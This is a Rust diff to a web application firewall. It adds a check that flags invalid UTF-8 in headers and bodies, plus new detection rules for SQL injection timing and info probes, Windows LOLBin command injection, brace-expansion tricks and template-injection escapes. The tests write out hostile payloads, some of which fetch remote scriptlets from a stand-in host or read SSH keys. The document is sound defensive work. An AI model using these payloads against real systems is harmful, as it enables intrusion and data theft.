@@ -46,6 +46,14 @@ pub const MAX_DECODE_PASSES: usize = 4;
 /// [`starter_rules`] — the engine emits it directly.
 pub const MULTI_ENCODING_RULE_ID: &str = "anomaly_multiple_encoding";
 
+/// The synthetic rule id reported when a field's raw bytes are not valid UTF-8
+/// (see [`Waf::flag_invalid_utf8`]). Like [`MULTI_ENCODING_RULE_ID`] it is not part of
+/// [`starter_rules`] — the engine emits it directly, as a [`WafCategory::ProtocolAnomaly`].
+/// Only fields carried as raw octets can trip it: header values and the request body. The
+/// method, path, and query reach the WAF as already-validated `&str` (hyper rejects a
+/// malformed request line upstream), so they can never be malformed here.
+pub const INVALID_UTF8_RULE_ID: &str = "anomaly_invalid_utf8";
+
 /// The signature class a rule belongs to.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum WafCategory {
@@ -206,6 +214,14 @@ pub struct Waf {
 	/// When true (default), input requiring more than one percent-decode pass to reach a
 	/// fixed point is blocked outright as a [`WafCategory::ProtocolAnomaly`].
 	block_multi_encoded: bool,
+	/// When true (default), a header value or request body whose raw bytes are not valid UTF-8
+	/// is flagged as a [`WafCategory::ProtocolAnomaly`] ([`INVALID_UTF8_RULE_ID`]) — the CRS
+	/// "UTF-8 encoding validation" signal. Without it, the WAF only ever sees the
+	/// `from_utf8_lossy` normalization of such bytes, so a malformed encoding (which can splice
+	/// a payload past a signature or simply mark a hand-crafted non-conformant request) is
+	/// invisible. Relaxable with [`flag_invalid_utf8`](Self::flag_invalid_utf8) for operators
+	/// who front genuinely binary-header traffic.
+	flag_invalid_utf8: bool,
 	/// When `Some(cap)`, request bodies are inspected up to `cap` bytes (the host layer
 	/// buffers that much before forwarding). `None` (default) leaves bodies uninspected —
 	/// body inspection means buffering, a request-handling cost the operator opts into.
@@ -254,7 +270,7 @@ impl Waf {
 		for cat in WafCategory::ALL {
 			weights[cat.index()] = cat.weight();
 		}
-		Ok(Self { set, meta, enabled, block_multi_encoded: true, body_inspection: None, scoring_threshold: None, weights, custom: Vec::new() })
+		Ok(Self { set, meta, enabled, block_multi_encoded: true, flag_invalid_utf8: true, body_inspection: None, scoring_threshold: None, weights, custom: Vec::new() })
 	}
 
 	/// Set whether multiply percent-encoded input is blocked outright as a protocol
@@ -264,6 +280,17 @@ impl Waf {
 	#[must_use]
 	pub fn block_multi_encoded(mut self, block: bool) -> Self {
 		self.block_multi_encoded = block;
+		self
+	}
+
+	/// Set whether a header value or request body whose raw bytes are not valid UTF-8 is
+	/// flagged as a protocol anomaly ([`INVALID_UTF8_RULE_ID`], default `true`). With it
+	/// `false`, such bytes are only ever scanned in their `from_utf8_lossy` form, so the
+	/// malformed encoding itself is not surfaced as a signal — set this only when the service
+	/// legitimately fronts binary-header traffic.
+	#[must_use]
+	pub fn flag_invalid_utf8(mut self, flag: bool) -> Self {
+		self.flag_invalid_utf8 = flag;
 		self
 	}
 
@@ -431,10 +458,17 @@ impl Waf {
 	#[must_use]
 	pub fn inspect_body(&self, body: &[u8]) -> Verdict {
 		let text = String::from_utf8_lossy(body);
-		match self.inspect_str(&text, "body") {
-			Some(m) => Verdict::Block(m),
-			None => Verdict::Allow,
+		// A concrete signature keeps precedence over the encoding anomaly: if the lossy form
+		// carries a real payload, name the specific rule that fired.
+		if let Some(m) = self.inspect_str(&text, "body") {
+			return Verdict::Block(m);
 		}
+		// Otherwise a body that isn't valid UTF-8 is itself the signal (CRS UTF-8 validation):
+		// the lossy scan came up clean, but the raw bytes are malformed.
+		if self.flag_invalid_utf8 && std::str::from_utf8(body).is_err() {
+			return Verdict::Block(WafMatch { rule_id: INVALID_UTF8_RULE_ID, category: WafCategory::ProtocolAnomaly, location: "body".to_owned(), score: None });
+		}
+		Verdict::Allow
 	}
 
 	/// The default WAF over [`starter_rules`]. The starter patterns are known-good and
@@ -571,10 +605,20 @@ impl Waf {
 			return Verdict::Block(m);
 		}
 		for (name, value) in &parts.headers {
-			if let Ok(s) = value.to_str()
-				&& let Some(m) = self.inspect_field(s, &format!("header:{name}"), false)
-			{
-				return Verdict::Block(m);
+			// Read the value as full UTF-8, not `to_str` (which rejects any non-visible-ASCII
+			// byte): a valid-UTF-8 non-ASCII header like `<script>café` would otherwise go
+			// entirely unscanned — a signature-evasion gap. Only genuinely malformed bytes
+			// (`str::from_utf8` fails) fall through to the encoding anomaly.
+			match std::str::from_utf8(value.as_bytes()) {
+				Ok(s) => {
+					if let Some(m) = self.inspect_field(s, &format!("header:{name}"), false) {
+						return Verdict::Block(m);
+					}
+				}
+				Err(_) if self.flag_invalid_utf8 => {
+					return Verdict::Block(WafMatch { rule_id: INVALID_UTF8_RULE_ID, category: WafCategory::ProtocolAnomaly, location: format!("header:{name}"), score: None });
+				}
+				Err(_) => {}
 			}
 		}
 		// Operator-authored custom rules run after the built-in signature fields, so a
@@ -712,8 +756,11 @@ impl Waf {
 			self.inspect_field_all(query, "query", true, &mut out);
 		}
 		for (name, value) in &parts.headers {
-			if let Ok(s) = value.to_str() {
-				self.inspect_field_all(s, &format!("header:{name}"), false, &mut out);
+			// Full UTF-8, not `to_str` — see the matching note in `inspect`.
+			match std::str::from_utf8(value.as_bytes()) {
+				Ok(s) => self.inspect_field_all(s, &format!("header:{name}"), false, &mut out),
+				Err(_) if self.flag_invalid_utf8 => out.push(WafMatch { rule_id: INVALID_UTF8_RULE_ID, category: WafCategory::ProtocolAnomaly, location: format!("header:{name}"), score: None }),
+				Err(_) => {}
 			}
 		}
 		// Custom filter-expression rules contribute to the aggregate score too.
@@ -1095,6 +1142,13 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "sqli_comment", category: WafCategory::Sqli, pattern: r"(--\s|#|/\*)[\s\S]*?(\bor\b|\band\b|=)" },
 		Rule { id: "sqli_time_based", category: WafCategory::Sqli, pattern: r"(?i)\b(sleep|benchmark|pg_sleep|waitfor\s+delay)\s*\(" },
 		Rule { id: "sqli_information_schema", category: WafCategory::Sqli, pattern: r"(?i)\binformation_schema\b" },
+		// MySQL system-variable info-leak probes (OWASP-CRS 942xxx): `@@version`, `@@datadir`,
+		// `@@hostname`, `@@basedir`, `@@secure_file_priv`, and the `@@global.`/`@@session.` scopes —
+		// the fingerprint/enumeration payloads an attacker appends once a UNION or error channel is
+		// open. The `@@` double-sigil is near-unique to MySQL/T-SQL (an email address has a single
+		// `@`), so false positives stay negligible without a leading-context anchor.
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf>
+		Rule { id: "sqli_mysql_sysvar", category: WafCategory::Sqli, pattern: r"(?i)@@(version|datadir|hostname|basedir|tmpdir|secure_file_priv|version_compile_os|global|session)\b" },
 		Rule { id: "sqli_into_outfile", category: WafCategory::Sqli, pattern: r"(?i)\binto\s+(out|dump)file\b" },
 		// MySQL privilege-escalation / file-read SQL beyond the `INTO OUTFILE` write and the `load_file`
 		// read already covered (OWASP-CRS rules 942151/942320 + 942480): `PROCEDURE ANALYSE` (the
@@ -1114,6 +1168,19 @@ pub fn starter_rules() -> Vec<Rule> {
 		// does not double-count against `sqli_or_tautology` in anomaly scoring.
 		Rule { id: "sqli_boolean_condition", category: WafCategory::Sqli, pattern: r#"(?i)(\band\b\s+['"]?\d+\s*[=<>]|\bor\b\s+['"]?\d+\s*[<>])\s*['"]?\d+"# },
 		Rule { id: "sqli_oob_exec", category: WafCategory::Sqli, pattern: r"(?i)\b(xp_cmdshell|xp_dirtree|load_file|utl_http|dbms_ldap)\b" },
+		// MSSQL time-based blind SQLi (OWASP-CRS rule 942190/942200 family): `WAITFOR DELAY '0:0:5'`
+		// / `WAITFOR TIME '...'`. The `sqli_time_based` rule above requires a `(` after the keyword —
+		// true for `sleep(` / `benchmark(` / `pg_sleep(`, but MSSQL's WAITFOR takes a *quoted* time and
+		// no parens, so it slips through. This dedicated rule closes that gap; `waitfor delay`/`waitfor
+		// time` is a near-unique T-SQL phrase, so false positives stay negligible.
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf>
+		Rule { id: "sqli_mssql_waitfor", category: WafCategory::Sqli, pattern: r"(?i)\bwaitfor\s+(delay|time)\b" },
+		// Oracle time-based blind SQLi (OWASP-CRS 942xxx Oracle set): `DBMS_PIPE.RECEIVE_MESSAGE(...)`
+		// (blocks the session for a timeout — Oracle's `SLEEP` analog) and `DBMS_LOCK.SLEEP(...)`. Both
+		// are Oracle-package calls the generic `sleep(`/`benchmark(` rule doesn't name; anchored to the
+		// `package.function(` call shape with tolerant whitespace so `dbms_pipe . receive_message (` also
+		// trips. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf>
+		Rule { id: "sqli_oracle_timing", category: WafCategory::Sqli, pattern: r"(?i)\b(dbms_pipe\s*\.\s*receive_message|dbms_lock\s*\.\s*sleep)\s*\(" },
 		// Quote-wrapped string tautology (OWASP-CRS 4.28.0 quote-evasion audit) — the classic
 		// `' OR 'a'='a` / `" AND "x"="x` auth-bypass the numeric `sqli_or_tautology` misses because
 		// the equality is between two *quoted strings*, not digits. Keyed on the quote →
@@ -1206,6 +1273,15 @@ pub fn starter_rules() -> Vec<Rule> {
 		// double-counts in anomaly scoring. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
 		Rule { id: "cmdi_recon_and_utility", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(nslookup|dig|telnet|tftp|socat|scp|ssh|ftp|lynx|fetch|chmod|chown|crontab|mkfifo|mknod|base64|xxd|msfvenom|busybox)\b" },
 		Rule { id: "cmdi_windows_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(dir|type|net\s+user|ping\s+-n|certutil|bitsadmin|tasklist|systeminfo)\b" },
+		// Windows living-off-the-land binaries (LOLBins) for fileless download/exec past the basic
+		// `cmd.exe` verbs above (OWASP-CRS 932xxx Windows command list): the script hosts and proxy-exec
+		// binaries attackers reach for — `mshta`, `regsvr32` (scrobj), `rundll32`, `wmic process call
+		// create`, `cscript`/`wscript`, `schtasks`, `reg add`, `sc create`. Same `[;&|]` leading-separator
+		// anchor as the sibling command rules (the false-positive guard); command names disjoint from
+		// `cmdi_windows_command` so a hit never double-counts. The short `reg`/`sc` verbs are pinned to
+		// their sub-command (`reg add`/`sc create`) so they don't fire on ordinary words.
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_windows_lolbin", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(mshta|regsvr32|rundll32|wmic|cscript|wscript|schtasks|reg\s+add|sc\s+create)\b" },
 		// PowerShell download-cradle / encoded-command RCE (OWASP-CRS rules 932120/932125): the vectors
 		// the `cmd.exe`-flavored `cmdi_windows_command` misses — the `Invoke-*` cmdlets and their
 		// aliased call form (`iex(`), the `Net.WebClient().DownloadString` / `Invoke-WebRequest`
@@ -1219,6 +1295,16 @@ pub fn starter_rules() -> Vec<Rule> {
 		// token itself; the `\b` tail keeps `$IFSomething` and a benign `${IF}` conditional clean.
 		// The `${IFS}` sequence does not occur in ordinary HTTP. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
 		Rule { id: "cmdi_ifs_evasion", category: WafCategory::CommandInjection, pattern: r"\$\{?IFS\b" },
+		// Brace-expansion RCE globbing (OWASP-CRS rule 932280): `{cat,/etc/passwd}` — the shell
+		// expands a comma brace-set into a space-free argument vector, another way to run a command
+		// with no literal whitespace. This is the low-false-positive re-entry design the earlier
+		// deferral called for: anchored on a leading shell separator (`;`/`&`/`|`/backtick) AND
+		// requiring the second brace element to be *path-like* (starts with `/`), so an ordinary
+		// query brace-set like `?tags={cat,dog}` (no separator, non-path second element) stays clean
+		// while `; {cat,/tmp/x}` / `| {nl,/home/u/.ssh/id_rsa}` trip. The bare-first `{,cmd}` form is
+		// deliberately left out — it has no path-like element to key on and would raise FP.
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_brace_expansion", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`]\s*\{[a-z0-9_.+-]+,\s*/[^,{}]*\}" },
 		// Shell fork-bomb resource-exhaustion payload (OWASP-CRS 4.25.0 LTS, PL2) — the classic
 		// `:(){ :|:& };:`. Keyed on the recursive self-pipe-into-background `:|:&` rather than the
 		// `(){` function-definition head, so it is a distinct signal from `anomaly_shellshock`'s
@@ -1303,6 +1389,15 @@ pub fn starter_rules() -> Vec<Rule> {
 		// (Rust `\s` already covers the vertical-tab CRS spells out); the `\]?\[` limb catches the
 		// `obj[constructor][prototype]` bracket-chain the dotted form misses. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf>
 		Rule { id: "code_prototype_pollution", category: WafCategory::CodeInjection, pattern: r"(?i)(__proto__|constructor\s*(?:\.|\]?\[)\s*prototype)" },
+		// Client-side template injection sandbox escape (AngularJS/Vue CSTI, tplmap gadget): the
+		// `constructor.constructor('…')()` chain that reaches the `Function` constructor to run
+		// arbitrary JS — e.g. `{{constructor.constructor('alert(1)')()}}`. Distinct from the
+		// prototype-pollution rule above (which keys on `constructor…prototype`): here it is the
+		// *double* `constructor` token that is the tell. The `(?:\.|\]?\[\s*["']?)` limb catches both
+		// the dotted `constructor.constructor` and the bracket `constructor['constructor']` forms; two
+		// adjacent `constructor` tokens essentially never occur in benign input.
+		// <https://portswigger.net/research/server-side-template-injection>
+		Rule { id: "code_csti_constructor", category: WafCategory::CodeInjection, pattern: r#"(?i)constructor\s*(?:\.|\]?\[\s*["']?)\s*constructor"# },
 		// Spring4Shell class-loader manipulation (OWASP-CRS rule 944260, CVE-2022-22965): a data-binding
 		// payload walking `class.module.classLoader...` to rewrite the Tomcat access-log pattern into a
 		// webshell, plus the `springframework.context.support.FileSystemXmlApplicationContext` SpEL
@@ -1530,6 +1625,52 @@ mod tests {
 		let waf = Waf::starter();
 		assert!(waf.inspect_str("price=floor(total/count)", "query").is_none(), "floor() math should not false-positive");
 		for uri in ["/docs/xml-extract-tutorial", "/api/floor-plans", "/blog/random-numbers"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn sqli_mysql_sysvar_matches() {
+		// OWASP-CRS 942xxx: MySQL system-variable info-leak probes via the `@@` double-sigil.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("id=1 UNION SELECT @@version", "query").unwrap().category, WafCategory::Sqli);
+		assert_eq!(waf.inspect_str("id=1 AND @@datadir", "query").unwrap().rule_id, "sqli_mysql_sysvar");
+		assert_eq!(waf.inspect_str("x=@@global.secure_file_priv", "query").unwrap().rule_id, "sqli_mysql_sysvar");
+	}
+
+	#[test]
+	fn sqli_mysql_sysvar_keeps_false_positives_low() {
+		// A single `@` (email), and unrelated `@@`-free text, stay clean.
+		let waf = Waf::starter();
+		assert!(waf.inspect_str("email=user@example.com", "query").is_none(), "email should not false-positive");
+		assert!(waf.inspect_str("handle=version-2", "query").is_none());
+	}
+
+	#[test]
+	fn sqli_mssql_waitfor_matches() {
+		// OWASP-CRS 942190/942200: MSSQL time-based blind, the no-paren WAITFOR the generic
+		// `sqli_time_based` rule (which requires `(`) misses.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("id=1; WAITFOR DELAY '0:0:5'", "query").unwrap().rule_id, "sqli_mssql_waitfor");
+		assert_eq!(waf.inspect_str("1);waitfor  time '01:00:00'--", "query").unwrap().category, WafCategory::Sqli);
+	}
+
+	#[test]
+	fn sqli_oracle_timing_matches() {
+		// OWASP-CRS 942xxx Oracle: DBMS_PIPE.RECEIVE_MESSAGE / DBMS_LOCK.SLEEP time delays.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("id=1 OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1", "query").unwrap().rule_id, "sqli_oracle_timing");
+		// `dbms_lock.sleep(` also embeds `.sleep(`, so the lower-index generic `sqli_time_based`
+		// legitimately claims it first — either way it's a Sqli block.
+		assert_eq!(waf.inspect_str("id=1;dbms_lock.sleep(5)", "query").unwrap().category, WafCategory::Sqli);
+	}
+
+	#[test]
+	fn sqli_dialect_timing_keeps_false_positives_low() {
+		// "wait for" as prose (no DELAY/TIME keyword) and unrelated `.sleep(` calls stay clean.
+		let waf = Waf::starter();
+		assert!(waf.inspect_str("please wait for the results", "query").is_none());
+		for uri in ["/blog/waitfor-processing", "/api/thread-sleep-guide"] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
@@ -1782,6 +1923,41 @@ mod tests {
 	}
 
 	#[test]
+	fn windows_lolbin_rule_matches() {
+		// OWASP-CRS 932xxx Windows LOLBins: the fileless download/proxy-exec binaries the basic
+		// cmd.exe verb rule doesn't name, each riding a shell separator.
+		let waf = Waf::starter();
+		for (payload, why) in [
+			("a=1; mshta http://x/a.hta", "mshta remote scriptlet"),
+			("b=2& regsvr32 /s /u /i:http://x/a.sct scrobj.dll", "regsvr32 scrobj"),
+			("c=3|rundll32 shell32.dll,Control_RunDLL calc", "rundll32 proxy"),
+			("d=4; wmic process call create calc", "wmic process create"),
+			("e=5& schtasks /create /tn p /tr calc", "schtasks persistence"),
+			("f=6| reg add HKCU\\x /v y", "reg add"),
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} ({why}) should trip a cmdi rule"));
+			assert_eq!(m.category, WafCategory::CommandInjection, "{payload} ({why})");
+		}
+		// The dedicated rule (not a sibling) claims a clean mshta hit.
+		assert_eq!(waf.inspect_str("x=1; mshta http://x/a.hta", "query").unwrap().rule_id, "cmdi_windows_lolbin");
+	}
+
+	#[test]
+	fn windows_lolbin_keeps_false_positives_low() {
+		// The LOLBin names as bare words with no shell separator, and short verbs like `reg`/`sc`
+		// without their sub-command, stay clean.
+		let waf = Waf::starter();
+		for uri in [
+			"/downloads/regsvr32-explained", // "regsvr32" prose, no separator
+			"/products/sc-registration",     // "sc" word, not `sc create`
+			"/blog/reg-of-companies",        // "reg" word, not `reg add`
+			"/wiki/wmic-reference",          // "wmic" prose, no separator
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
 	fn ifs_evasion_rule_matches() {
 		// OWASP-CRS 932130/932200: the `$IFS` / `${IFS}` internal-field-separator substitution used to
 		// build a space-free command line.
@@ -1804,6 +1980,29 @@ mod tests {
 		for uri in ["/docs/if-statements", "/api/config?tpl=${IF}-then"] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
+	}
+
+	#[test]
+	fn brace_expansion_rule_matches() {
+		// OWASP-CRS 932280: `{cmd,/path}` brace-expansion globbing riding a shell separator, with a
+		// path-like second element. Kept clear of /etc/passwd (which the traversal rule claims first)
+		// so first-match attributes these to the brace rule.
+		let waf = Waf::starter();
+		for payload in ["x=1; {cat,/tmp/secret.txt}", "y=2| {nl,/home/u/.ssh/id_rsa}", "z=3&{head,/var/log/app.log}"] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip the brace rule"));
+			assert_eq!(m.rule_id, "cmdi_brace_expansion", "{payload}");
+			assert_eq!(m.category, WafCategory::CommandInjection);
+		}
+	}
+
+	#[test]
+	fn brace_expansion_keeps_false_positives_low() {
+		// The false positives the earlier deferral flagged: a query brace-set with no shell separator,
+		// and a brace-set whose second element is not path-like, both stay clean.
+		let waf = Waf::starter();
+		assert!(waf.inspect_str("tags={cat,dog}", "query").is_none(), "non-path brace-set should not false-positive");
+		assert!(waf.inspect_str("sizes={s,m,l}", "query").is_none(), "plain brace-set should not false-positive");
+		assert!(waf.inspect_str("path=/tmp/{a,b}", "query").is_none(), "brace-set with no leading shell separator should not false-positive");
 	}
 
 	#[test]
@@ -2651,6 +2850,27 @@ mod tests {
 	}
 
 	#[test]
+	fn csti_constructor_rule_matches() {
+		// AngularJS/Vue CSTI sandbox escape: the double-`constructor` chain to the Function ctor,
+		// in both dotted and bracket forms, however whitespace-padded.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("q={{constructor.constructor('alert(1)')()}}", "query").unwrap().rule_id, "code_csti_constructor");
+		assert_eq!(waf.inspect_str("x=constructor['constructor']('return 1')", "query").unwrap().rule_id, "code_csti_constructor");
+		assert_eq!(waf.inspect_str("x=constructor [ constructor ]", "query").unwrap().category, WafCategory::CodeInjection);
+	}
+
+	#[test]
+	fn csti_constructor_keeps_false_positives_low() {
+		// A single `constructor` reference — a class doc, a `.constructor.name` type check — stays
+		// clean; the rule needs two adjacent `constructor` tokens.
+		let waf = Waf::starter();
+		assert!(waf.inspect_str("x=obj.constructor.name", "query").is_none(), "single constructor should not false-positive");
+		for uri in ["/docs/constructor-overloading", "/api/constructor-injection-di"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
 	fn spring4shell_rule_matches() {
 		// OWASP-CRS 944260 (CVE-2022-22965): the class-loader walk and the SpEL context gadget.
 		let waf = Waf::starter();
@@ -3021,5 +3241,93 @@ mod tests {
 		let waf = Waf::starter().disable_category(WafCategory::ProtocolAnomaly);
 		let m = waf.inspect_str("a%252e%252e%252fb", "target").unwrap();
 		assert_eq!(m.rule_id, MULTI_ENCODING_RULE_ID);
+	}
+
+	/// Build a `Parts` carrying one header whose raw value bytes are exactly `value`. Bypasses
+	/// `HeaderValue`'s `&str` path so genuinely non-UTF-8 octets reach the WAF.
+	fn parts_with_raw_header(name: &str, value: &[u8]) -> Parts {
+		let hv = axum::http::HeaderValue::from_bytes(value).unwrap();
+		Request::builder().method("GET").uri("/").header(name, hv).body(()).unwrap().into_parts().0
+	}
+
+	#[test]
+	fn invalid_utf8_header_is_flagged_as_protocol_anomaly() {
+		let waf = Waf::starter();
+		// A lone continuation byte (0x80) is not valid UTF-8 and is legal in a header value.
+		let v = waf.inspect(&parts_with_raw_header("x-probe", &[0x80]));
+		let m = blocked(&v);
+		assert_eq!(m.rule_id, INVALID_UTF8_RULE_ID);
+		assert_eq!(m.category, WafCategory::ProtocolAnomaly);
+		assert_eq!(m.location, "header:x-probe");
+	}
+
+	#[test]
+	fn invalid_utf8_header_can_be_relaxed() {
+		let waf = Waf::starter().flag_invalid_utf8(false);
+		// With the flag off, a malformed-encoding header carrying no ASCII signature is allowed.
+		assert_eq!(waf.inspect(&parts_with_raw_header("x-probe", &[0xff, 0xfe])), Verdict::Allow);
+	}
+
+	#[test]
+	fn valid_utf8_non_ascii_header_is_not_flagged() {
+		let waf = Waf::starter();
+		// `é` (0xC3 0xA9) is valid UTF-8 though not visible ASCII — a malformed-encoding flag
+		// must not fire on it (it just goes unscanned, as before).
+		assert_eq!(waf.inspect(&parts_with_raw_header("x-name", "café".as_bytes())), Verdict::Allow);
+	}
+
+	#[test]
+	fn invalid_utf8_body_is_flagged_when_no_signature_matches() {
+		let waf = Waf::starter();
+		let v = waf.inspect_body(&[0xc0, 0xaf]); // overlong '/', invalid UTF-8
+		let m = blocked(&v);
+		assert_eq!(m.rule_id, INVALID_UTF8_RULE_ID);
+		assert_eq!(m.category, WafCategory::ProtocolAnomaly);
+		assert_eq!(m.location, "body");
+	}
+
+	#[test]
+	fn body_signature_wins_over_invalid_utf8_anomaly() {
+		let waf = Waf::starter();
+		// A body with a real XSS payload plus a trailing invalid byte: the specific signature
+		// is reported, not the generic encoding anomaly.
+		let mut body = b"<script>alert(1)</script>".to_vec();
+		body.push(0xff);
+		let v = waf.inspect_body(&body);
+		assert_eq!(blocked(&v).category, WafCategory::Xss);
+	}
+
+	#[test]
+	fn valid_utf8_body_is_not_flagged() {
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_body("just a normal comment".as_bytes()), Verdict::Allow);
+	}
+
+	#[test]
+	fn invalid_utf8_header_contributes_to_anomaly_score() {
+		let waf = Waf::starter();
+		let matches = waf.inspect_all(&parts_with_raw_header("x-probe", &[0x80]));
+		assert!(matches.iter().any(|m| m.rule_id == INVALID_UTF8_RULE_ID && m.category == WafCategory::ProtocolAnomaly));
+	}
+
+	#[test]
+	fn non_ascii_utf8_header_is_still_scanned_for_signatures() {
+		let waf = Waf::starter();
+		// A valid-UTF-8 non-ASCII byte (`é`) makes `HeaderValue::to_str()` fail, but the
+		// payload must still be inspected — reading via `str::from_utf8` closes that gap.
+		let mut val = "<script>café".as_bytes().to_vec();
+		val.extend_from_slice(b"</script>");
+		let v = waf.inspect(&parts_with_raw_header("x-note", &val));
+		assert_eq!(blocked(&v).category, WafCategory::Xss);
+		// And it also surfaces in the scoring/collect-all path.
+		let matches = waf.inspect_all(&parts_with_raw_header("x-note", &val));
+		assert!(matches.iter().any(|m| m.category == WafCategory::Xss));
+	}
+
+	#[test]
+	fn benign_non_ascii_utf8_header_is_allowed() {
+		let waf = Waf::starter();
+		// The wider scan must not false-positive on an ordinary UTF-8 header value.
+		assert_eq!(waf.inspect(&parts_with_raw_header("x-name", "Björk Guðmundsdóttir".as_bytes())), Verdict::Allow);
 	}
 }
